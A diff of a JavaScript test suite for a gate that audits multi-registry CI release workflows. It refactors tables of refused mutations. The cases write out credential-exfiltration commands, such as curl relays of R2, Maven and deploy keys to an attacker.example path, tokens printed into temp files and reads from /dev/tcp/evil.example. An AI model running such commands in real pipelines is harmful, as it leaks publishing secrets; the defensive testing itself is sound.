@@ -71,7 +71,7 @@ const append = (w, file, job, needle, line) => {
 
 /** Each refuses row's findings, snapshotted (row-snapshots.mjs). */
 const ROWS = rowSnapshots("row-findings.json");
-const expectCount = (label, got) => ROWS.check(label, got);
+const expectFindings = (label, got) => ROWS.check(label, got);
 afterAll(() => ROWS.finish());
 
 describe("the real release workflows", () => {
@@ -81,136 +81,138 @@ describe("the real release workflows", () => {
 describe("a credential leaves no job through curl or a file (round 5, HIGH)", () => {
   const RELAY = (name) =>
     `curl -fsS --proto =https --tlsv1.2 "https://proxy.golang.org/attacker.example/\${${name}}/@v/list"`;
-  it.each([
-    [
-      "H1 maven: a proxy relay of MAVEN_R2_SECRET_ACCESS_KEY",
-      (w) =>
-        append(
-          w,
-          P,
-          "publish-maven",
-          "MAVEN_R2_SECRET_ACCESS_KEY",
-          RELAY("MAVEN_R2_SECRET_ACCESS_KEY"),
-        ),
-      /curl is not a command environment sdk-publish-maven's job runs|credential/,
-    ],
-    [
-      "H2 cli upload: a proxy relay of R2_SECRET_ACCESS_KEY",
-      (w) => append(w, C, "upload", "R2_SECRET_ACCESS_KEY", RELAY("R2_SECRET_ACCESS_KEY")),
-      /credential R2_SECRET_ACCESS_KEY outside its recorded position/,
-    ],
-    [
-      "H3 cli promote: a proxy relay of two keys",
-      (w) =>
-        append(
-          w,
-          C,
-          "promote",
-          "R2_SECRET_ACCESS_KEY",
-          'curl -fsS "https://proxy.golang.org/attacker.example/${R2_ACCESS_KEY_ID}/${R2_SECRET_ACCESS_KEY}/@v/list"',
-        ),
-      /credential R2_ACCESS_KEY_ID outside/,
-    ],
-    [
-      "H5 maven: the secret printed into publish-tmp",
-      (w) =>
-        append(
-          w,
-          P,
-          "publish-maven",
-          "MAVEN_R2_SECRET_ACCESS_KEY",
-          "printf '%s\\n' \"${MAVEN_R2_SECRET_ACCESS_KEY}\" > publish-tmp/k",
-        ),
-      /credential MAVEN_R2_SECRET_ACCESS_KEY outside/,
-    ],
-    [
-      "N1 crates: the OIDC token printed into publish-tmp",
-      (w) => {
-        const s = w[P].jobs["publish-crates"].steps.find((x) => x.name === "Upload");
-        s.run = "printf '%s\\n' \"${CARGO_REGISTRY_TOKEN}\" > publish-tmp/leak\n" + s.run;
-      },
-      /credential CARGO_REGISTRY_TOKEN outside/,
-    ],
-    [
-      "go: a relay of the deploy key, though curl is the Go job's",
-      (w) =>
-        append(
-          w,
-          P,
-          "publish-go",
-          "DEPLOY_KEY",
-          'curl -fsS "https://proxy.golang.org/github.com/confeature/sdks/apps/sdk-go/@v/${DEPLOY_KEY}"',
-        ),
-      /credential DEPLOY_KEY outside/,
-    ],
-    [
-      "go: an expansion before /@v/",
-      (w) =>
-        inject(w, P, "publish-go", {
-          run: 'curl -fsS "https://proxy.golang.org/${UNIT_VERSION}/x/@v/list"',
-        }),
-      /curl reaches only .*, exactly/,
-    ],
-    [
-      "go: another module on the proxy",
-      (w) =>
-        inject(w, P, "publish-go", {
-          run: 'curl -fsS "https://proxy.golang.org/attacker.example/x/@v/list"',
-        }),
-      /curl reaches only .*, exactly/,
-    ],
-    [
-      "npm: curl outside the Go job",
-      (w) =>
-        inject(w, P, "publish-npm", {
-          run: 'curl -fsS "https://proxy.golang.org/github.com/confeature/sdks/apps/sdk-go/@v/list"',
-        }),
-      /curl is not a command environment sdk-publish-npm's job runs/,
-    ],
-    [
-      "npm: git outside the git jobs",
-      (w) =>
-        inject(w, P, "publish-npm", {
-          run: "git push git@github.com:confeature/sdks.git HEAD:refs/heads/x",
-        }),
-      /git is not a command environment sdk-publish-npm's job runs/,
-    ],
-    [
-      "nuget: a credential that is not a deploy key, written as one",
-      (w) =>
-        append(
-          w,
-          P,
-          "publish-nuget",
-          "NUGET_API_KEY",
-          "printf '%s\\n' \"$NUGET_API_KEY\" > publish-tmp/ssh/key",
-        ),
-      /credential NUGET_API_KEY outside/,
-    ],
-    [
-      "packagist: the deploy key written anywhere but its file",
-      (w) =>
-        append(
-          w,
-          P,
-          "publish-packagist",
-          "DEPLOY_KEY",
-          "printf '%s\\n' \"$DEPLOY_KEY\" > publish-tmp/copy",
-        ),
-      /credential DEPLOY_KEY outside/,
-    ],
-    [
-      "a credential through env.: a step env that copies one",
-      (w) => {
-        const s = w[P].jobs["publish-nuget"].steps.find((x) => x.name === "Upload");
-        s.env = { ...s.env, COPY: "${{ env.NUGET_API_KEY }}" };
-        s.run += "\nprintf '%s\\n' \"$COPY\"\n";
-      },
-      /credential COPY outside/,
-    ],
-  ])("%s", (label, mutate, why) => {
+  it.each(
+    ROWS.rows([
+      [
+        "H1 maven: a proxy relay of MAVEN_R2_SECRET_ACCESS_KEY",
+        (w) =>
+          append(
+            w,
+            P,
+            "publish-maven",
+            "MAVEN_R2_SECRET_ACCESS_KEY",
+            RELAY("MAVEN_R2_SECRET_ACCESS_KEY"),
+          ),
+        /curl is not a command environment sdk-publish-maven's job runs|credential/,
+      ],
+      [
+        "H2 cli upload: a proxy relay of R2_SECRET_ACCESS_KEY",
+        (w) => append(w, C, "upload", "R2_SECRET_ACCESS_KEY", RELAY("R2_SECRET_ACCESS_KEY")),
+        /credential R2_SECRET_ACCESS_KEY outside its recorded position/,
+      ],
+      [
+        "H3 cli promote: a proxy relay of two keys",
+        (w) =>
+          append(
+            w,
+            C,
+            "promote",
+            "R2_SECRET_ACCESS_KEY",
+            'curl -fsS "https://proxy.golang.org/attacker.example/${R2_ACCESS_KEY_ID}/${R2_SECRET_ACCESS_KEY}/@v/list"',
+          ),
+        /credential R2_ACCESS_KEY_ID outside/,
+      ],
+      [
+        "H5 maven: the secret printed into publish-tmp",
+        (w) =>
+          append(
+            w,
+            P,
+            "publish-maven",
+            "MAVEN_R2_SECRET_ACCESS_KEY",
+            "printf '%s\\n' \"${MAVEN_R2_SECRET_ACCESS_KEY}\" > publish-tmp/k",
+          ),
+        /credential MAVEN_R2_SECRET_ACCESS_KEY outside/,
+      ],
+      [
+        "N1 crates: the OIDC token printed into publish-tmp",
+        (w) => {
+          const s = w[P].jobs["publish-crates"].steps.find((x) => x.name === "Upload");
+          s.run = "printf '%s\\n' \"${CARGO_REGISTRY_TOKEN}\" > publish-tmp/leak\n" + s.run;
+        },
+        /credential CARGO_REGISTRY_TOKEN outside/,
+      ],
+      [
+        "go: a relay of the deploy key, though curl is the Go job's",
+        (w) =>
+          append(
+            w,
+            P,
+            "publish-go",
+            "DEPLOY_KEY",
+            'curl -fsS "https://proxy.golang.org/github.com/confeature/sdks/apps/sdk-go/@v/${DEPLOY_KEY}"',
+          ),
+        /credential DEPLOY_KEY outside/,
+      ],
+      [
+        "go: an expansion before /@v/",
+        (w) =>
+          inject(w, P, "publish-go", {
+            run: 'curl -fsS "https://proxy.golang.org/${UNIT_VERSION}/x/@v/list"',
+          }),
+        /curl reaches only .*, exactly/,
+      ],
+      [
+        "go: another module on the proxy",
+        (w) =>
+          inject(w, P, "publish-go", {
+            run: 'curl -fsS "https://proxy.golang.org/attacker.example/x/@v/list"',
+          }),
+        /curl reaches only .*, exactly/,
+      ],
+      [
+        "npm: curl outside the Go job",
+        (w) =>
+          inject(w, P, "publish-npm", {
+            run: 'curl -fsS "https://proxy.golang.org/github.com/confeature/sdks/apps/sdk-go/@v/list"',
+          }),
+        /curl is not a command environment sdk-publish-npm's job runs/,
+      ],
+      [
+        "npm: git outside the git jobs",
+        (w) =>
+          inject(w, P, "publish-npm", {
+            run: "git push git@github.com:confeature/sdks.git HEAD:refs/heads/x",
+          }),
+        /git is not a command environment sdk-publish-npm's job runs/,
+      ],
+      [
+        "nuget: a credential that is not a deploy key, written as one",
+        (w) =>
+          append(
+            w,
+            P,
+            "publish-nuget",
+            "NUGET_API_KEY",
+            "printf '%s\\n' \"$NUGET_API_KEY\" > publish-tmp/ssh/key",
+          ),
+        /credential NUGET_API_KEY outside/,
+      ],
+      [
+        "packagist: the deploy key written anywhere but its file",
+        (w) =>
+          append(
+            w,
+            P,
+            "publish-packagist",
+            "DEPLOY_KEY",
+            "printf '%s\\n' \"$DEPLOY_KEY\" > publish-tmp/copy",
+          ),
+        /credential DEPLOY_KEY outside/,
+      ],
+      [
+        "a credential through env.: a step env that copies one",
+        (w) => {
+          const s = w[P].jobs["publish-nuget"].steps.find((x) => x.name === "Upload");
+          s.env = { ...s.env, COPY: "${{ env.NUGET_API_KEY }}" };
+          s.run += "\nprintf '%s\\n' \"$COPY\"\n";
+        },
+        /credential COPY outside/,
+      ],
+    ]),
+  )("%s", (label, mutate, why) => {
     const got = added(mutate);
-    expectCount(label, got);
+    expectFindings(label, got);
     expect(
       got.some((g) => why.test(g)),
       got.join("\n"),
@@ -247,65 +249,67 @@ describe("ENVIRONMENT_COMMANDS lists exactly what each job runs", () => {
 
 describe("16 every expression reference names something (round 5)", () => {
   const job = (w, id) => w[P].jobs[id];
-  it.each([
-    [
-      "a renamed setup output (the UNIT_PATH bug's other door)",
-      (w) => {
-        const o = job(w, "setup").outputs;
-        o.unitPath = o.path;
-        delete o.path;
-      },
-      /needs\.setup\.outputs\.path: job setup has no output path/,
-    ],
-    [
-      "a need the job does not declare",
-      (w) => {
-        job(w, "publish-crates").env.UNIT_PATH = "${{ needs.pack-npm.outputs.file }}";
-      },
-      /publish-crates does not need pack-npm/,
-    ],
-    [
-      "a step output of a later step",
-      (w) => {
-        const s = job(w, "publish-crates").steps;
-        s[0].with = { ...s[0].with, x: "${{ steps.auth.outputs.token }}" };
-      },
-      /no earlier step of publish-crates has id auth/,
-    ],
-    [
-      "an env name nothing defines",
-      (w) => {
-        job(w, "pack-npm").steps.find((s) => s.uses?.startsWith("actions/setup-node")).with[
-          "node-version"
-        ] = "${{ env.NODE_VER }}";
-      },
-      /no env: in scope defines NODE_VER/,
-    ],
-    [
-      "an input the workflow does not declare",
-      (w) => {
-        job(w, "setup").steps.find((s) => s.id === "resolve").env.UNIT = "${{ inputs.unitName }}";
-      },
-      /declares no input unitName/,
-    ],
-    [
-      "a job if: on an undeclared need",
-      (w) => {
-        job(w, "publish-npm").if = "needs.pack-pypi.result == 'success'";
-      },
-      /publish-npm does not need pack-pypi/,
-    ],
-    [
-      "cli-release: an output the release job does not declare",
-      (w) => {
-        w[C].jobs.upload.steps.find((s) => s.env?.EXPECTED).env.EXPECTED =
-          "${{ needs.build.outputs.digest }}";
-      },
-      /job build has no output digest/,
-    ],
-  ])("refuses %s", (label, mutate, why) => {
+  it.each(
+    ROWS.rows([
+      [
+        "a renamed setup output (the UNIT_PATH bug's other door)",
+        (w) => {
+          const o = job(w, "setup").outputs;
+          o.unitPath = o.path;
+          delete o.path;
+        },
+        /needs\.setup\.outputs\.path: job setup has no output path/,
+      ],
+      [
+        "a need the job does not declare",
+        (w) => {
+          job(w, "publish-crates").env.UNIT_PATH = "${{ needs.pack-npm.outputs.file }}";
+        },
+        /publish-crates does not need pack-npm/,
+      ],
+      [
+        "a step output of a later step",
+        (w) => {
+          const s = job(w, "publish-crates").steps;
+          s[0].with = { ...s[0].with, x: "${{ steps.auth.outputs.token }}" };
+        },
+        /no earlier step of publish-crates has id auth/,
+      ],
+      [
+        "an env name nothing defines",
+        (w) => {
+          job(w, "pack-npm").steps.find((s) => s.uses?.startsWith("actions/setup-node")).with[
+            "node-version"
+          ] = "${{ env.NODE_VER }}";
+        },
+        /no env: in scope defines NODE_VER/,
+      ],
+      [
+        "an input the workflow does not declare",
+        (w) => {
+          job(w, "setup").steps.find((s) => s.id === "resolve").env.UNIT = "${{ inputs.unitName }}";
+        },
+        /declares no input unitName/,
+      ],
+      [
+        "a job if: on an undeclared need",
+        (w) => {
+          job(w, "publish-npm").if = "needs.pack-pypi.result == 'success'";
+        },
+        /publish-npm does not need pack-pypi/,
+      ],
+      [
+        "cli-release: an output the release job does not declare",
+        (w) => {
+          w[C].jobs.upload.steps.find((s) => s.env?.EXPECTED).env.EXPECTED =
+            "${{ needs.build.outputs.digest }}";
+        },
+        /job build has no output digest/,
+      ],
+    ]),
+  )("refuses %s", (label, mutate, why) => {
     const got = added(mutate);
-    expectCount(label, got);
+    expectFindings(label, got);
     expect(
       got.some((g) => why.test(g)),
       got.join("\n"),
@@ -338,83 +342,85 @@ describe("the gate itself runs rule 16", () => {
 
 describe("the values an exception trusts are pinned (round 5, MED)", () => {
   const stepWith = (w, file, job, pred) => w[file].jobs[job].steps.find(pred);
-  it.each([
-    [
-      "N2 a step-level UNIT_PATH on the cargo step",
-      (w) => {
-        const s = stepWith(w, P, "publish-crates", (x) => x.name === "Upload");
-        s.env = { ...s.env, UNIT_PATH: "publish-tmp/evil" };
-      },
-      /UNIT_PATH is publish-tmp\/evil, not its pinned expression/,
-    ],
-    [
-      "N2b a literal job-level UNIT_PATH",
-      (w) => {
-        w[P].jobs["publish-crates"].env.UNIT_PATH = "publish-tmp/evil";
-      },
-      /UNIT_PATH is publish-tmp\/evil, not its pinned expression/,
-    ],
-    [
-      "H4 UNIT_PATH to publish-tmp plus the token in a forged crate",
-      (w) => {
-        const s = stepWith(w, P, "publish-crates", (x) => x.name === "Upload");
-        s.env = { ...s.env, UNIT_PATH: "publish-tmp/evil" };
-        s.run =
-          "printf '%s\\n' \"${CARGO_REGISTRY_TOKEN}\" > publish-tmp/evil/src/lib.rs\n" + s.run;
-      },
-      /not its pinned expression|credential CARGO_REGISTRY_TOKEN/,
-    ],
-    [
-      "T1 cli upload: a step-level TAG",
-      (w) => {
-        const s = stepWith(
-          w,
-          C,
-          "upload",
-          (x) => typeof x.run === "string" && x.run.includes("publish-r2"),
-        );
-        s.env = { ...s.env, TAG: "cli-v0.0.1" };
-      },
-      /TAG is cli-v0\.0\.1, not its pinned expression/,
-    ],
-    [
-      "T2 cli upload: a job-level TAG",
-      (w) => {
-        w[C].jobs.upload.env = { ...(w[C].jobs.upload.env ?? {}), TAG: "cli-v0.0.1" };
-      },
-      /TAG is cli-v0\.0\.1, not its pinned expression/,
-    ],
-    [
-      "N10 a TAG from the event's commit message",
-      (w) => {
-        const s = stepWith(
-          w,
-          C,
-          "upload",
-          (x) => typeof x.run === "string" && x.run.includes("publish-r2"),
-        );
-        s.env = { ...s.env, TAG: "${{ github.event.head_commit.message }}" };
-      },
-      /TAG is \$\{\{ github\.event\.head_commit\.message \}\}, not its pinned expression/,
-    ],
-    [
-      "a step that redefines its job's value with the same expression",
-      (w) => {
-        const s = stepWith(w, P, "publish-crates", (x) => x.name === "Upload");
-        s.env = { ...s.env, UNIT_PATH: "${{ needs.setup.outputs.path }}" };
-      },
-      /redefines the job's UNIT_PATH/,
-    ],
-    [
-      "an artifact name from another output",
-      (w) => {
-        w[P].jobs["publish-npm"].env.ARTIFACT = "${{ needs.pack-npm.outputs.sha256 }}";
-      },
-      /ARTIFACT is .*, not its pinned expression/,
-    ],
-  ])("refuses %s", (label, mutate, why) => {
+  it.each(
+    ROWS.rows([
+      [
+        "N2 a step-level UNIT_PATH on the cargo step",
+        (w) => {
+          const s = stepWith(w, P, "publish-crates", (x) => x.name === "Upload");
+          s.env = { ...s.env, UNIT_PATH: "publish-tmp/evil" };
+        },
+        /UNIT_PATH is publish-tmp\/evil, not its pinned expression/,
+      ],
+      [
+        "N2b a literal job-level UNIT_PATH",
+        (w) => {
+          w[P].jobs["publish-crates"].env.UNIT_PATH = "publish-tmp/evil";
+        },
+        /UNIT_PATH is publish-tmp\/evil, not its pinned expression/,
+      ],
+      [
+        "H4 UNIT_PATH to publish-tmp plus the token in a forged crate",
+        (w) => {
+          const s = stepWith(w, P, "publish-crates", (x) => x.name === "Upload");
+          s.env = { ...s.env, UNIT_PATH: "publish-tmp/evil" };
+          s.run =
+            "printf '%s\\n' \"${CARGO_REGISTRY_TOKEN}\" > publish-tmp/evil/src/lib.rs\n" + s.run;
+        },
+        /not its pinned expression|credential CARGO_REGISTRY_TOKEN/,
+      ],
+      [
+        "T1 cli upload: a step-level TAG",
+        (w) => {
+          const s = stepWith(
+            w,
+            C,
+            "upload",
+            (x) => typeof x.run === "string" && x.run.includes("publish-r2"),
+          );
+          s.env = { ...s.env, TAG: "cli-v0.0.1" };
+        },
+        /TAG is cli-v0\.0\.1, not its pinned expression/,
+      ],
+      [
+        "T2 cli upload: a job-level TAG",
+        (w) => {
+          w[C].jobs.upload.env = { ...(w[C].jobs.upload.env ?? {}), TAG: "cli-v0.0.1" };
+        },
+        /TAG is cli-v0\.0\.1, not its pinned expression/,
+      ],
+      [
+        "N10 a TAG from the event's commit message",
+        (w) => {
+          const s = stepWith(
+            w,
+            C,
+            "upload",
+            (x) => typeof x.run === "string" && x.run.includes("publish-r2"),
+          );
+          s.env = { ...s.env, TAG: "${{ github.event.head_commit.message }}" };
+        },
+        /TAG is \$\{\{ github\.event\.head_commit\.message \}\}, not its pinned expression/,
+      ],
+      [
+        "a step that redefines its job's value with the same expression",
+        (w) => {
+          const s = stepWith(w, P, "publish-crates", (x) => x.name === "Upload");
+          s.env = { ...s.env, UNIT_PATH: "${{ needs.setup.outputs.path }}" };
+        },
+        /redefines the job's UNIT_PATH/,
+      ],
+      [
+        "an artifact name from another output",
+        (w) => {
+          w[P].jobs["publish-npm"].env.ARTIFACT = "${{ needs.pack-npm.outputs.sha256 }}";
+        },
+        /ARTIFACT is .*, not its pinned expression/,
+      ],
+    ]),
+  )("refuses %s", (label, mutate, why) => {
     const got = added(mutate);
-    expectCount(label, got);
+    expectFindings(label, got);
     expect(
       got.some((g) => why.test(g)),
       got.join("\n"),
@@ -423,40 +429,42 @@ describe("the values an exception trusts are pinned (round 5, MED)", () => {
 });
 
 describe("git's configuration isolation sits on the git steps (round 5)", () => {
-  it.each([
-    [
-      "publish-go sets GIT_CONFIG_GLOBAL at job level, which checkout inherits",
-      (w) => {
-        w[P].jobs["publish-go"].env.GIT_CONFIG_GLOBAL = "/dev/null";
-      },
-      /GIT_CONFIG_GLOBAL is set in the job's env, which actions\/checkout inherits/,
-    ],
-    [
-      "the workflow env sets GIT_CONFIG_NOSYSTEM",
-      (w) => {
-        w[P].env.GIT_CONFIG_NOSYSTEM = "1";
-      },
-      /GIT_CONFIG_NOSYSTEM is set in the workflow's env/,
-    ],
-    [
-      "a mirror's git step without the isolation",
-      (w) => {
-        const s = w[P].jobs["publish-packagist"].steps.find((x) => x.name === "Upload");
-        delete s.env.GIT_CONFIG_GLOBAL;
-      },
-      /step Upload runs git without GIT_CONFIG_GLOBAL: \/dev\/null/,
-    ],
-    [
-      "the Go push with GIT_CONFIG_NOSYSTEM off",
-      (w) => {
-        w[P].jobs["publish-go"].steps.find((x) => x.name === "Upload").env.GIT_CONFIG_NOSYSTEM =
-          "0";
-      },
-      /runs git without GIT_CONFIG_NOSYSTEM: 1|points every tool at another configuration/,
-    ],
-  ])("refuses %s", (label, mutate, why) => {
+  it.each(
+    ROWS.rows([
+      [
+        "publish-go sets GIT_CONFIG_GLOBAL at job level, which checkout inherits",
+        (w) => {
+          w[P].jobs["publish-go"].env.GIT_CONFIG_GLOBAL = "/dev/null";
+        },
+        /GIT_CONFIG_GLOBAL is set in the job's env, which actions\/checkout inherits/,
+      ],
+      [
+        "the workflow env sets GIT_CONFIG_NOSYSTEM",
+        (w) => {
+          w[P].env.GIT_CONFIG_NOSYSTEM = "1";
+        },
+        /GIT_CONFIG_NOSYSTEM is set in the workflow's env/,
+      ],
+      [
+        "a mirror's git step without the isolation",
+        (w) => {
+          const s = w[P].jobs["publish-packagist"].steps.find((x) => x.name === "Upload");
+          delete s.env.GIT_CONFIG_GLOBAL;
+        },
+        /step Upload runs git without GIT_CONFIG_GLOBAL: \/dev\/null/,
+      ],
+      [
+        "the Go push with GIT_CONFIG_NOSYSTEM off",
+        (w) => {
+          w[P].jobs["publish-go"].steps.find((x) => x.name === "Upload").env.GIT_CONFIG_NOSYSTEM =
+            "0";
+        },
+        /runs git without GIT_CONFIG_NOSYSTEM: 1|points every tool at another configuration/,
+      ],
+    ]),
+  )("refuses %s", (label, mutate, why) => {
     const got = added(mutate);
-    expectCount(label, got);
+    expectFindings(label, got);
     expect(
       got.some((g) => why.test(g)),
       got.join("\n"),
@@ -471,134 +479,139 @@ describe("the reviewers' round-4 driver cases, each refused for its own reason",
   const PRINTF = /printf takes no option/;
   const INPUT = /reads input only from publish-tmp\/ or a path this job downloads to/;
   const OPX = /an operator expansion \(\$\{NAME…\}\) is allowed only in a recorded exception/;
-  it.each([
-    ["P1 printf '-v' X y", s("publish-maven", { run: "printf '-v' X y" }), PRINTF],
-    ["P2 printf '-vHOME' x", s("publish-maven", { run: "printf '-vHOME' x" }), PRINTF],
-    ['P3 printf "-v" X y', s("publish-maven", { run: 'printf "-v" X y' }), PRINTF],
-    ["P3b printf -v'' X y", s("publish-maven", { run: "printf -v'' X y" }), PRINTF],
-    [
-      "M1 job env NPM_VERSION npm:evil",
-      (w) => {
-        w[P].jobs["publish-npm"].env.NPM_VERSION = "npm:evil@1.0.0";
-      },
-      /env NPM_VERSION redefines the workflow's NPM_VERSION/,
-    ],
-    [
-      "M2 step env RUST_VERSION",
-      s("publish-crates", { run: "echo x", env: { RUST_VERSION: "nightly" } }),
-      /env RUST_VERSION redefines the workflow's RUST_VERSION/,
-    ],
-    [
-      "M3 step env TAG",
-      s("publish-crates", { run: "echo x", env: { TAG: "evil" } }),
-      /TAG is evil, not its pinned expression/,
-    ],
-    [
-      "M4 job env MAVEN_URL",
-      (w) => {
-        w[P].jobs["publish-maven"].env = {
-          ...(w[P].jobs["publish-maven"].env ?? {}),
-          MAVEN_URL: "https://evil.example",
-        };
-      },
-      /env MAVEN_URL redefines the workflow's MAVEN_URL/,
-    ],
-    ["L1 sort < /dev/tcp", s("publish-maven", { run: "sort < /dev/tcp/evil.example/80" }), INPUT],
-    [
-      "N3 GIT_CONFIG_GLOBAL=publish-tmp/gc",
-      s("publish-maven", { run: "echo x", env: { GIT_CONFIG_GLOBAL: "publish-tmp/gc" } }),
-      /sets GIT_CONFIG_GLOBAL, which points every tool at another configuration/,
-    ],
-    [
-      "N3c GIT_CONFIG_COUNT",
-      s("publish-maven", { run: "echo x", env: { GIT_CONFIG_COUNT: "1" } }),
-      /sets GIT_CONFIG_COUNT, which CREDENTIALED_ENV does not allow/,
-    ],
-    [
-      "N3d workflow env BASH_ENV",
-      (w) => {
-        w[P].env.BASH_ENV = "publish-tmp/rc";
-      },
-      /sets BASH_ENV, which CREDENTIALED_ENV does not allow/,
-    ],
-    [
-      "N3e workflow env GIT_CONFIG_GLOBAL",
-      (w) => {
-        w[P].env.GIT_CONFIG_GLOBAL = "publish-tmp/gc";
-      },
-      /GIT_CONFIG_GLOBAL is set in the workflow's env|sets GIT_CONFIG_GLOBAL, which points/,
-    ],
-    [
-      "N3f workflow env CURL_HOME",
-      (w) => {
-        w[P].env.CURL_HOME = "publish-tmp";
-      },
-      /sets CURL_HOME, which CREDENTIALED_ENV does not allow/,
-    ],
-    [
-      "N3g step env HOME",
-      s("publish-maven", { run: "echo x", env: { HOME: "/dev/null" } }),
-      /sets HOME, which points every tool at another configuration/,
-    ],
-    [
-      'N4 sort < "${TAG:-/dev/tcp/h/80}"',
-      s("publish-maven", { run: 'sort < "${TAG:-/dev/tcp/h/80}"' }),
-      /a redirection target must be a literal path/,
-    ],
-    [
-      "N4b curl with an operator expansion",
-      s("publish-go", { run: 'curl -fsS --proto =https "https://proxy.golang.org/${TAG:-x}"' }),
-      OPX,
-    ],
-    ['N4c echo "${TAG:-x}"', s("publish-maven", { run: 'echo "${TAG:-x}"' }), OPX],
-    [
-      "N5 sha256sum < release/x where the job downloads to dist/",
-      (w) =>
-        inject(w, C, "upload", { name: "injected", run: "sha256sum --check --strict < release/x" }),
-      INPUT,
-    ],
-    [
-      "N5b sort < dist/x where the job downloads to release/",
-      s("publish-maven", { run: "sort < dist/x" }),
-      INPUT,
-    ],
-    [
-      "N6 npm publishing a forged package.json from publish-tmp",
-      s("publish-npm", {
-        run: "npm publish --access public --provenance --ignore-scripts ./publish-tmp/p",
-      }),
-      /npm publish uploads only \.\/release\/\$\{ARTIFACT\}/,
-    ],
-    [
-      "N7 git push from the npm job",
-      s("publish-npm", { run: "git push git@github.com:confeature/sdks.git HEAD:refs/heads/x" }),
-      /git is not a command environment sdk-publish-npm's job runs/,
-    ],
-    [
-      "N8 a quoted 'if'",
-      s("publish-maven", { run: "'if' echo x" }),
-      /if is not a command a credentialed job runs/,
-    ],
-    [
-      "N9 a comment that assigns",
-      s("pack-crates", { run: '# FOO=\necho "${FOO}"' }),
-      /reads \$FOO, which no env:/,
-    ],
-    [
-      "gem pushing another file",
-      s("publish-rubygems", { run: 'gem push "./release/x.gem"' }),
-      /gem push uploads only/,
-    ],
-    [
-      "dotnet pushing another file",
-      s("publish-nuget", {
-        run: 'dotnet nuget push "./release/x.nupkg" --source https://api.nuget.org/v3/index.json',
-      }),
-      /dotnet nuget push uploads only/,
-    ],
-  ])("refuses %s", (label, mutate, why) => {
+  it.each(
+    ROWS.rows([
+      ["P1 printf '-v' X y", s("publish-maven", { run: "printf '-v' X y" }), PRINTF],
+      ["P2 printf '-vHOME' x", s("publish-maven", { run: "printf '-vHOME' x" }), PRINTF],
+      ['P3 printf "-v" X y', s("publish-maven", { run: 'printf "-v" X y' }), PRINTF],
+      ["P3b printf -v'' X y", s("publish-maven", { run: "printf -v'' X y" }), PRINTF],
+      [
+        "M1 job env NPM_VERSION npm:evil",
+        (w) => {
+          w[P].jobs["publish-npm"].env.NPM_VERSION = "npm:evil@1.0.0";
+        },
+        /env NPM_VERSION redefines the workflow's NPM_VERSION/,
+      ],
+      [
+        "M2 step env RUST_VERSION",
+        s("publish-crates", { run: "echo x", env: { RUST_VERSION: "nightly" } }),
+        /env RUST_VERSION redefines the workflow's RUST_VERSION/,
+      ],
+      [
+        "M3 step env TAG",
+        s("publish-crates", { run: "echo x", env: { TAG: "evil" } }),
+        /TAG is evil, not its pinned expression/,
+      ],
+      [
+        "M4 job env MAVEN_URL",
+        (w) => {
+          w[P].jobs["publish-maven"].env = {
+            ...(w[P].jobs["publish-maven"].env ?? {}),
+            MAVEN_URL: "https://evil.example",
+          };
+        },
+        /env MAVEN_URL redefines the workflow's MAVEN_URL/,
+      ],
+      ["L1 sort < /dev/tcp", s("publish-maven", { run: "sort < /dev/tcp/evil.example/80" }), INPUT],
+      [
+        "N3 GIT_CONFIG_GLOBAL=publish-tmp/gc",
+        s("publish-maven", { run: "echo x", env: { GIT_CONFIG_GLOBAL: "publish-tmp/gc" } }),
+        /sets GIT_CONFIG_GLOBAL, which points every tool at another configuration/,
+      ],
+      [
+        "N3c GIT_CONFIG_COUNT",
+        s("publish-maven", { run: "echo x", env: { GIT_CONFIG_COUNT: "1" } }),
+        /sets GIT_CONFIG_COUNT, which CREDENTIALED_ENV does not allow/,
+      ],
+      [
+        "N3d workflow env BASH_ENV",
+        (w) => {
+          w[P].env.BASH_ENV = "publish-tmp/rc";
+        },
+        /sets BASH_ENV, which CREDENTIALED_ENV does not allow/,
+      ],
+      [
+        "N3e workflow env GIT_CONFIG_GLOBAL",
+        (w) => {
+          w[P].env.GIT_CONFIG_GLOBAL = "publish-tmp/gc";
+        },
+        /GIT_CONFIG_GLOBAL is set in the workflow's env|sets GIT_CONFIG_GLOBAL, which points/,
+      ],
+      [
+        "N3f workflow env CURL_HOME",
+        (w) => {
+          w[P].env.CURL_HOME = "publish-tmp";
+        },
+        /sets CURL_HOME, which CREDENTIALED_ENV does not allow/,
+      ],
+      [
+        "N3g step env HOME",
+        s("publish-maven", { run: "echo x", env: { HOME: "/dev/null" } }),
+        /sets HOME, which points every tool at another configuration/,
+      ],
+      [
+        'N4 sort < "${TAG:-/dev/tcp/h/80}"',
+        s("publish-maven", { run: 'sort < "${TAG:-/dev/tcp/h/80}"' }),
+        /a redirection target must be a literal path/,
+      ],
+      [
+        "N4b curl with an operator expansion",
+        s("publish-go", { run: 'curl -fsS --proto =https "https://proxy.golang.org/${TAG:-x}"' }),
+        OPX,
+      ],
+      ['N4c echo "${TAG:-x}"', s("publish-maven", { run: 'echo "${TAG:-x}"' }), OPX],
+      [
+        "N5 sha256sum < release/x where the job downloads to dist/",
+        (w) =>
+          inject(w, C, "upload", {
+            name: "injected",
+            run: "sha256sum --check --strict < release/x",
+          }),
+        INPUT,
+      ],
+      [
+        "N5b sort < dist/x where the job downloads to release/",
+        s("publish-maven", { run: "sort < dist/x" }),
+        INPUT,
+      ],
+      [
+        "N6 npm publishing a forged package.json from publish-tmp",
+        s("publish-npm", {
+          run: "npm publish --access public --provenance --ignore-scripts ./publish-tmp/p",
+        }),
+        /npm publish uploads only \.\/release\/\$\{ARTIFACT\}/,
+      ],
+      [
+        "N7 git push from the npm job",
+        s("publish-npm", { run: "git push git@github.com:confeature/sdks.git HEAD:refs/heads/x" }),
+        /git is not a command environment sdk-publish-npm's job runs/,
+      ],
+      [
+        "N8 a quoted 'if'",
+        s("publish-maven", { run: "'if' echo x" }),
+        /if is not a command a credentialed job runs/,
+      ],
+      [
+        "N9 a comment that assigns",
+        s("pack-crates", { run: '# FOO=\necho "${FOO}"' }),
+        /reads \$FOO, which no env:/,
+      ],
+      [
+        "gem pushing another file",
+        s("publish-rubygems", { run: 'gem push "./release/x.gem"' }),
+        /gem push uploads only/,
+      ],
+      [
+        "dotnet pushing another file",
+        s("publish-nuget", {
+          run: 'dotnet nuget push "./release/x.nupkg" --source https://api.nuget.org/v3/index.json',
+        }),
+        /dotnet nuget push uploads only/,
+      ],
+    ]),
+  )("refuses %s", (label, mutate, why) => {
     const got = added(mutate);
-    expectCount(label, got);
+    expectFindings(label, got);
     expect(
       got.some((g) => why.test(g)),
       got.join("\n") || "no finding",
@@ -622,211 +635,224 @@ describe("round 5's bypasses: a credential reaches no unpinned name, no test and
